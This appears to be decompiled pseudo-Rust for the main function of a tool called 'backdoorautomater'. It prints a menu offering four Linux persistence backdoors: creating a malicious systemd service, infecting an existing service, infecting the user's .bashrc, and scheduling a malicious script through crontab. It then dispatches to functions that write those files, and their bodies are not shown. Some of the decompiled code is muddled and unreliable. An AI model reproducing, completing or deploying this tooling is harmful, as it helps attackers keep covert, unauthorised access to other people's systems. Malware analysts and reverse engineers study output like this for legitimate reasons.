fn backdoorautomater::main() -> int {
    let v0: void*;  // [bp-0x3b8], Other Possible Types: struct24, u128
    let v2: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x3b0]
    let v3: void*;  // [bp-0x3a8], Other Possible Types: u64
    let v4: struct24;  // [bp-0x398], Other Possible Types: u8
    let v5: struct48;  // [bp-0x398]
    let v6: u64;  // [bp-0x388]
    let v7: void*;  // [bp-0x380], Other Possible Types: std::io::stdio::Stdin, struct24
    let v8: struct24;  // [bp-0x380]
    let v9: u64;  // [bp-0x378]
    let v10: u32;  // [bp-0x370]
    let v11: struct24;  // [bp-0x368]
    let v12: u64;  // [bp-0x360]
    let v13: u128;  // [bp-0x358]
    let v14: struct24;  // [bp-0x350]
    let v15: u64;  // [bp-0x348]
    let v16: u128;  // [bp-0x340]
    let v17: struct24;  // [bp-0x338]
    let v18: u64;  // [bp-0x330]
    let v19: u128;  // [bp-0x328]
    let v20: struct24;  // [bp-0x320]
    let v21: u64;  // [bp-0x318]
    let v22: u128;  // [bp-0x310]
    let v23: struct24;  // [bp-0x308]
    let v24: u64;  // [bp-0x300]
    let v25: void*;  // [bp-0x2f8]
    let v26: u8;  // [bp-0x2f0]
    let v27: struct24;  // [bp-0x2e8], Other Possible Types: u128
    let v28: u64;  // [bp-0x2d8]
    let v29: struct24;  // [bp-0x2c8]
    let v30: struct24;  // [bp-0x2a8]
    let v31: struct145;  // [bp-0x290]
    let v32: struct145;  // [bp-0x1f8]
    let v33: struct145;  // [bp-0x160]
    let v34: struct145;  // [bp-0xc8]
    let v37: u64;  // rdx
    let v38: u64;  // r15
    let v39: struct24;  // r12d
    let v40: u32;  // ecx
    let v42: u32;  // ecx
    let v43: u32;  // ecx
    let v47: u32;  // ecx
    let v49: u64;  // rax
    let v52: core::result::Result<usize, std::io::error::Error>;  // rax:rdx
    let v53: core::result::Result<u8, core::num::error::ParseIntError>;  // rax:rax
    let v54: &str;  // rax:rdx

    do {
        println!("\x1b[33mChoose what kind of backdoor you want to install !\n");
        println!("1 Create new systemd malicious service \n");
        println!("2 Infect existing systemd service \n");
        println!("3 Infect .bashrc of current user \n");
        println!("4 Schedule malicious script with crontab \n");
        v0 = 0;
        v2 = 1;
        v3 = 0;
        v7 = std::io::stdio::stdin();
        v52 = std::io::stdio::Stdin::read_line(&v7, &v0);
        core::result::Result<T,E>::expect(v52 as i64, *((&v52 as &char + 8) as &i64), "src/main.rs");
        v54 = core::str::<impl str>::trim_matches(v2, v3);
        v53 = core::num::<impl core::str::traits::FromStr for u8>::from_str(v54.data_ptr, v54.length) as u128;
        v38 = v37;
        v7 = <T as alloc::slice::hack::ConvertVec>::to_vec("Concert String to Integer: Error");
        v5 = struct48 {
            field_0: *(&v7.field_0 as &i128)
            field_16: v10
            field_24: <alloc::string::String as core::ops::arith::Add<&str>>::add(&v4 as u128, v2, v3)
        };
        v39 = v38;
        core::result::Result<T,E>::expect(*(&v53 as &i32) & 1, v39 as u64, 1, v10, "src/main.rs");
        v0 = alloc::vec::Vec<T,A>::clear();
    } while (!v38);
    v7 = 0;
    v9 = 1;
    v10 = 0;
    v12 = 1;
    v13 = 0;
    v15 = 1;
    v26 = 0;
    v16 = 0;
    v18 = 1;
    v19 = 0;
    v21 = 1;
    v22 = 0;
    v24 = 1;
    v25 = 0;
    match (v39) {
        1 => {
            backdoorautomater::Param::set_param(&v7, 1);
            v31 = <backdoorautomater::Param as core::clone::Clone>::clone(&v7);
            backdoorautomater::sanitizer::sanitize_param_hub(&v31, 1, v37, v40);
            v28 = v13;
            v27 = *((&v10 as &char + 8) as &i128);
            v3 = v16;
            v0 = *((&v13 as &char + 8) as &i128);
            v6 = v10;
            v4 = *(&v7 as &i128);
            backdoorautomater::sanitizer::sanitize_return_fn(backdoorautomater::newservice::write_service(&v27, &v0, &v4, *(&v26 as &i32)));
        }
        2 => {
            backdoorautomater::Param::set_param(&v7, 2);
            v32 = <backdoorautomater::Param as core::clone::Clone>::clone(&v7);
            backdoorautomater::sanitizer::sanitize_param_hub(&v32, 2, v37, v47);
            v29 = v11;
            v27 = v20;
            v0 = v8;
            v4 = v14;
            v49 = backdoorautomater::modifyservice::get_service(&v29, &v27, *(&v26 as &i32), &v0, &v4);
            backdoorautomater::sanitizer::sanitize_return_fn(v49);
        }
        3 => {
            backdoorautomater::Param::set_param(&v7, 3);
            v33 = <backdoorautomater::Param as core::clone::Clone>::clone(&v7);
            backdoorautomater::sanitizer::sanitize_param_hub(&v33, 3, v37, v42);
            v29 = v8;
            v27 = v14;
            v0 = v20;
            v4 = v23;
            backdoorautomater::shellscript::create_script(&v29, &v27, &v0, &v4, *(&v26 as &i32));
        }
        4 => {
            backdoorautomater::Param::set_param(&v7, 4);
            v34 = <backdoorautomater::Param as core::clone::Clone>::clone(&v7);
            backdoorautomater::sanitizer::sanitize_param_hub(&v34, 4, v37, v43);
            v30 = v8;
            v29 = v14;
            v27 = v20;
            v0 = v23;
            v4 = v17;
            backdoorautomater::sanitizer::sanitize_return_fn(backdoorautomater::cronshell::create_cron(&v30, &v29, &v27, &v0, *(&v26 as &i32), &v4));
        }
    }
    return;
}
